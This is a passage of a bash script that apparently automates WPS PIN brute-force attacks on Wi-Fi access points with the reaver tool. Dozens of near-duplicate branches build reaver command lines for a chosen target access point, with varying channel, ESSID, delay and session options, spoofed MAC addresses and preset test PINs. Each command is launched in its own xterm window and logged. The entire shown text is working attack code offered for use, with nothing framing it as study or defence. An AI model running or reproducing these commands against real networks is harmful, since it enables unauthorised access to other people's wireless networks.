xterm -g 80x10-1+1 -T "Reaver3he-dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver3he-dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver4he-dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver4he-dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5he-dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5he-dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6he-dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6he-dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7he-dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7he-dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &


		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8he-dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8he-dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

###End all -dh-small  Reaver Program Booleans with -e essid End all -dh-small###

}

#~~~~~~~~~~~~~End Reaver Booleans End~~~~~~~~~~~~~~~~~#

#~~~~~~~~~~Start Reset pin 12345670 temp test Start~~~~~~~~~~#

STARTPIN_BOOLEANS_fn()

{

MACSTRIP=$(echo $TARGETAP1 | tr -d -c [:xdigit:])
########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

#######Start Reaver channel hopping options

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5h-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5h-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6h-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6h-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7h-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7h-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8h-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8h-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

###End  Reaver Program Booleans no -e essid End###

###Start Reaver Program Booleans Start with -e essid###

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5e-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5e-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6e-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6e-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7e-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7e-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8e-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8e-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5he-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5he-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6he-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6he-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7he-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7he-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8he-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8he-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

###End All no --dh-small -S End#####

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

